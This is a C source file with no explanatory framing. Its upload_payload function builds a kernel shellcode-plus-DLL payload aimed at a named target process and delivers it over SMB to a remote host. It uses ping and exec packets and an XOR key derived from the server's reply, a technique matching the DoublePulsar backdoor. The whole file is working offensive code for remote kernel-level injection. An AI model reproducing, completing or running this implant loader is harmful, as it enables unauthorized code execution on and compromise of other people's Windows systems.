#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern void xor_buffer(unsigned char *buffer, size_t length, uint32_t key);

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    HANDLE file = INVALID_HANDLE_VALUE;
    SOCKET sock = INVALID_SOCKET;
    WSADATA wsa_data;
    int wsa_started = 0;
    unsigned char *dll = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    unsigned char *response = NULL;
    size_t dll_size = 0;
    size_t payload_size = 0;
    size_t response_size = 0;
    size_t i;
    uint32_t hash = 0;
    uint32_t sig;
    uint32_t key;
    uint32_t dll_size_u32;
    uint32_t total_field;
    uint16_t user_id;
    uint16_t tree_id;
    LARGE_INTEGER file_size;
    struct sockaddr_in address;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart <= 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)UINT32_MAX - 3978U)
        goto cleanup;

    dll_size = (size_t)file_size.QuadPart;
    if (dll_size > SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE)
        goto cleanup;
    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size > UINT32_MAX)
        goto cleanup;

    dll = (unsigned char *)malloc(dll_size);
    payload = (unsigned char *)malloc(payload_size);
    if (dll == NULL || payload == NULL)
        goto cleanup;

    {
        size_t total_read = 0;
        while (total_read < dll_size) {
            DWORD amount = (DWORD)((dll_size - total_read) > MAXDWORD
                                       ? MAXDWORD
                                       : (dll_size - total_read));
            DWORD bytes_read = 0;
            if (!ReadFile(file, dll + total_read, amount, &bytes_read, NULL) ||
                bytes_read == 0)
                goto cleanup;
            total_read += bytes_read;
        }
        {
            unsigned char extra;
            DWORD bytes_read = 0;
            if (!ReadFile(file, &extra, 1, &bytes_read, NULL) || bytes_read != 0)
                goto cleanup;
        }
    }

    CloseHandle(file);
    file = INVALID_HANDLE_VALUE;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll, dll_size);

    dll_size_u32 = (uint32_t)dll_size;
    total_field = dll_size_u32 + 3978U;

    if ((size_t)KERNEL_RUNDLL_TOTAL_OFFSET > payload_size ||
        payload_size - (size_t)KERNEL_RUNDLL_TOTAL_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > payload_size ||
        payload_size - (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > payload_size ||
        payload_size - (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > payload_size ||
        payload_size - (size_t)KERNEL_RUNDLL_HASH_OFFSET < 4)
        goto cleanup;

    payload[KERNEL_RUNDLL_TOTAL_OFFSET] = (unsigned char)total_field;
    payload[KERNEL_RUNDLL_TOTAL_OFFSET + 1] = (unsigned char)(total_field >> 8);
    payload[KERNEL_RUNDLL_TOTAL_OFFSET + 2] = (unsigned char)(total_field >> 16);
    payload[KERNEL_RUNDLL_TOTAL_OFFSET + 3] = (unsigned char)(total_field >> 24);

    payload[KERNEL_RUNDLL_DLLSIZE_OFFSET] = (unsigned char)dll_size_u32;
    payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 1] = (unsigned char)(dll_size_u32 >> 8);
    payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 2] = (unsigned char)(dll_size_u32 >> 16);
    payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 3] = (unsigned char)(dll_size_u32 >> 24);

    payload[KERNEL_RUNDLL_ORDINAL_OFFSET] = 1;
    payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 1] = 0;
    payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 2] = 0;
    payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 3] = 0;

    for (i = 0; TARGET_INJECT_PROCESS[i] != '\0'; ++i)
        hash = hash * 127U + (unsigned char)TARGET_INJECT_PROCESS[i];

    payload[KERNEL_RUNDLL_HASH_OFFSET] = (unsigned char)hash;
    payload[KERNEL_RUNDLL_HASH_OFFSET + 1] = (unsigned char)(hash >> 8);
    payload[KERNEL_RUNDLL_HASH_OFFSET + 2] = (unsigned char)(hash >> 16);
    payload[KERNEL_RUNDLL_HASH_OFFSET + 3] = (unsigned char)(hash >> 24);

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;
    wsa_started = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1 ||
        connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    {
        const unsigned char *commands[4];
        size_t command_lengths[4];
        size_t command_index;

        commands[0] = (const unsigned char *)SMB_NEGOTIATE_PKT;
        command_lengths[0] = sizeof(SMB_NEGOTIATE_PKT) - 1;
        commands[1] = (const unsigned char *)SMB_SESSION_SETUP_PKT;
        command_lengths[1] = sizeof(SMB_SESSION_SETUP_PKT) - 1;
        commands[2] = (const unsigned char *)SMB_TREE_CONNECT_PKT;
        command_lengths[2] = sizeof(SMB_TREE_CONNECT_PKT) - 1;
        commands[3] = (const unsigned char *)DP_PING_PKT;
        command_lengths[3] = sizeof(DP_PING_PKT) - 1;

        for (command_index = 0; command_index < 4; ++command_index) {
            unsigned char *outgoing;
            size_t outgoing_length = command_lengths[command_index];
            size_t sent = 0;
            unsigned char header[4];
            uint32_t netbios_length;
            size_t received = 0;

            outgoing = (unsigned char *)malloc(outgoing_length);
            if (outgoing == NULL)
                goto cleanup;
            memcpy(outgoing, commands[command_index], outgoing_length);

            if (command_index == 2) {
                if (outgoing_length < 34) {
                    free(outgoing);
                    goto cleanup;
                }
                outgoing[32] = (unsigned char)user_id;
                outgoing[33] = (unsigned char)(user_id >> 8);
            } else if (command_index == 3) {
                if (outgoing_length < 34) {
                    free(outgoing);
                    goto cleanup;
                }
                outgoing[28] = (unsigned char)tree_id;
                outgoing[29] = (unsigned char)(tree_id >> 8);
                outgoing[32] = (unsigned char)user_id;
                outgoing[33] = (unsigned char)(user_id >> 8);
            }

            while (sent < outgoing_length) {
                int n = send(sock, (const char *)outgoing + sent,
                             (int)(outgoing_length - sent), 0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(outgoing);
                    goto cleanup;
                }
                sent += (size_t)n;
            }
            free(outgoing);

            while (received < sizeof(header)) {
                int n = recv(sock, (char *)header + received,
                             (int)(sizeof(header) - received), 0);
                if (n == SOCKET_ERROR || n == 0)
                    goto cleanup;
                received += (size_t)n;
            }

            netbios_length = ((uint32_t)header[1] << 16) |
                             ((uint32_t)header[2] << 8) |
                             (uint32_t)header[3];
            if (netbios_length == 0 || netbios_length > 0x00FFFFFFU)
                goto cleanup;
            if ((size_t)netbios_length > SIZE_MAX - sizeof(header))
                goto cleanup;

            free(response);
            response = NULL;
            response_size = (size_t)netbios_length + sizeof(header);
            response = (unsigned char *)malloc(response_size);
            if (response == NULL)
                goto cleanup;
            memcpy(response, header, sizeof(header));

            received = 0;
            while (received < (size_t)netbios_length) {
                int n = recv(sock, (char *)response + sizeof(header) + received,
                             (int)(((size_t)netbios_length - received) > INT_MAX
                                       ? INT_MAX
                                       : ((size_t)netbios_length - received)),
                             0);
                if (n == SOCKET_ERROR || n == 0)
                    goto cleanup;
                received += (size_t)n;
            }

            if (command_index == 1) {
                if (response_size <= 33)
                    goto cleanup;
                user_id = (uint16_t)response[32] |
                          (uint16_t)((uint16_t)response[33] << 8);
            } else if (command_index == 2) {
                if (response_size <= 29)
                    goto cleanup;
                tree_id = (uint16_t)response[28] |
                          (uint16_t)((uint16_t)response[29] << 8);
            } else if (command_index == 3) {
                if ((size_t)SMB_RESP_SIGNATURE_START > response_size ||
                    response_size - (size_t)SMB_RESP_SIGNATURE_START < 4)
                    goto cleanup;
                sig = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                      ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                      ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                      ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
                key = (2U * sig) ^
                      ((((sig >> 16) | (sig & 0x00FF0000U)) >> 8) |
                       (((sig << 16) | (sig & 0x0000FF00U)) << 8));
            }
        }
    }

    xor_buffer(payload, payload_size, key);

    {
        size_t offset = 0;
        unsigned char *exec_packet;
        const size_t template_length = (size_t)SMB_EXEC_TEMPLATE_LEN;
        const size_t parameter_length = 12;
        size_t maximum_packet_size = template_length + parameter_length +
                                     (size_t)SMB_EXEC_SHELLCODE_LEN;

        if (sizeof(DP_EXEC_PKT) - 1 < template_length ||
            maximum_packet_size < template_length)
            goto cleanup;

        exec_packet = (unsigned char *)malloc(maximum_packet_size);
        if (exec_packet == NULL)
            goto cleanup;

        while (offset < payload_size) {
            size_t chunk = payload_size - offset;
            size_t exec_length;
            size_t sent = 0;
            unsigned char *parameters;
            unsigned char header[4];
            uint32_t netbios_length;
            size_t received = 0;

            if (chunk > (size_t)SMB_EXEC_SHELLCODE_LEN)
                chunk = (size_t)SMB_EXEC_SHELLCODE_LEN;
            exec_length = template_length + parameter_length + chunk;

            memcpy(exec_packet, DP_EXEC_PKT, template_length);
            parameters = exec_packet + template_length;

            {
                uint32_t values[3];
                size_t j;
                values[0] = (uint32_t)payload_size;
                values[1] = (uint32_t)chunk;
                values[2] = (uint32_t)offset;
                for (i = 0; i < 3; ++i) {
                    parameters[i * 4] = (unsigned char)values[i];
                    parameters[i * 4 + 1] = (unsigned char)(values[i] >> 8);
                    parameters[i * 4 + 2] = (unsigned char)(values[i] >> 16);
                    parameters[i * 4 + 3] = (unsigned char)(values[i] >> 24);
                }
                xor_buffer(parameters, parameter_length, key);
                for (j = 0; j < chunk; ++j)
                    exec_packet[template_length + parameter_length + j] =
                        payload[offset + j];
            }

            if ((size_t)SMB_NETBIOS_LEN_OFFSET >= template_length ||
                (size_t)SMB_EXEC_TOTAL_DATA_OFFSET + 1 >= template_length ||
                (size_t)SMB_EXEC_DATA_COUNT_OFFSET + 1 >= template_length ||
                (size_t)SMB_EXEC_BYTE_COUNT_OFFSET + 1 >= template_length ||
                (size_t)SMB_TID_OFFSET + 1 >= template_length ||
                (size_t)SMB_UID_OFFSET + 1 >= template_length) {
                free(exec_packet);
                goto cleanup;
            }

            netbios_length = (uint32_t)(chunk + template_length +
                                        parameter_length - 4);
            exec_packet[SMB_NETBIOS_LEN_OFFSET] =
                (unsigned char)(netbios_length >> 16);
            exec_packet[SMB_NETBIOS_LEN_OFFSET + 1] =
                (unsigned char)(netbios_length >> 8);
            exec_packet[SMB_NETBIOS_LEN_OFFSET + 2] =
                (unsigned char)netbios_length;

            exec_packet[SMB_EXEC_TOTAL_DATA_OFFSET] = (unsigned char)chunk;
            exec_packet[SMB_EXEC_TOTAL_DATA_OFFSET + 1] =
                (unsigned char)(chunk >> 8);
            exec_packet[SMB_EXEC_DATA_COUNT_OFFSET] = (unsigned char)chunk;
            exec_packet[SMB_EXEC_DATA_COUNT_OFFSET + 1] =
                (unsigned char)(chunk >> 8);

            {
                size_t byte_count = chunk + parameter_length;
                exec_packet[SMB_EXEC_BYTE_COUNT_OFFSET] =
                    (unsigned char)byte_count;
                exec_packet[SMB_EXEC_BYTE_COUNT_OFFSET + 1] =
                    (unsigned char)(byte_count >> 8);
            }

            exec_packet[SMB_TID_OFFSET] = (unsigned char)tree_id;
            exec_packet[SMB_TID_OFFSET + 1] = (unsigned char)(tree_id >> 8);
            exec_packet[SMB_UID_OFFSET] = (unsigned char)user_id;
            exec_packet[SMB_UID_OFFSET + 1] = (unsigned char)(user_id >> 8);

            while (sent < exec_length) {
                int n = send(sock, (const char *)exec_packet + sent,
                             (int)(exec_length - sent), 0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(exec_packet);
                    goto cleanup;
                }
                sent += (size_t)n;
            }

            while (received < sizeof(header)) {
                int n = recv(sock, (char *)header + received,
                             (int)(sizeof(header) - received), 0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(exec_packet);
                    goto cleanup;
                }
                received += (size_t)n;
            }

            netbios_length = ((uint32_t)header[1] << 16) |
                             ((uint32_t)header[2] << 8) |
                             (uint32_t)header[3];
            if (netbios_length == 0) {
                free(exec_packet);
                goto cleanup;
            }

            free(response);
            response = NULL;
            response_size = (size_t)netbios_length + sizeof(header);
            response = (unsigned char *)malloc(response_size);
            if (response == NULL) {
                free(exec_packet);
                goto cleanup;
            }
            memcpy(response, header, sizeof(header));

            received = 0;
            while (received < (size_t)netbios_length) {
                int n = recv(sock, (char *)response + sizeof(header) + received,
                             (int)(((size_t)netbios_length - received) > INT_MAX
                                       ? INT_MAX
                                       : ((size_t)netbios_length - received)),
                             0);
                if (n == SOCKET_ERROR || n == 0) {
                    free(exec_packet);
                    goto cleanup;
                }
                received += (size_t)n;
            }

            offset += chunk;
        }

        free(exec_packet);
    }

    if ((size_t)DP_RESP_MUX_ID_OFFSET >= response_size ||
        response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC)
        goto cleanup;

    result = 0;

cleanup:
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();
    free(dll);
    free(payload);
    free(packet);
    free(response);
    return result;
}